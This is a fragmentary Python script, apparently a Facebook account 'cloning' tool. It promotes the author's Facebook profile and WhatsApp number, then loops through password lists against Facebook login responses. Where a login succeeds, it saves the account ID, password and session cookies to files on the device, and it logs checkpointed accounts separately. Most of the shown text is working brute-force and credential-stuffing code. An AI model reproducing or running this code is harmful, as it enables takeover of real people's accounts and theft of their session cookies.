...
import sys
#-----------Opening Print-----------#
print(' [\033[1;32m●\033[1;37m]\x1b[38;5;121m CHECKING KMATCHO SERVER !\033[1;37m [\033[1;32m–\033[1;37m]\033[1;37m')
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100011366828931')
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
...
\_______)  (______/   |/       
        ...
        #####----Message link
        os.system("xdg-open https://wa.me/+213669491481")
    else:
        lisens()
...
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{G1} V{G1}/{G1}1.0
...
def main():
    ...
    line()
    print(" \x1b[38;5;46m[1] FILE CLONEING\033[1;37m")
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in req:            	
                print('\r\r\x1b[38;5;46m [SDF•OK] '+ids+' <> '+pas)   
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print("\r\r\x1b[38;5;193m<>❮ "+coki)
                oks.append(ids)
                open('/sdcard/JSDF–OKEY–M1.txt', 'a').write(ids+'|'+pas+'\n')
                open('/sdcard/SDF•COOKIE•M1.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;34m [SDF•CP] '+ids+' <> '+pas)
                open('/sdcard/SDF-CP.txt', 'a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in req:            	
                ...
                oks.append(ids)
                open('/sdcard/SDF–OKEY–M2.txt', 'a').write(ids+'|'+pas+'\n')
                open('/sdcard/SDF•COOKIE•M2.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;34m [SDF•CP] '+ids+' <> '+pas)
                open('/sdcard/SDF–CP.txt', 'a').write(ids+'|'+pas+'\n')
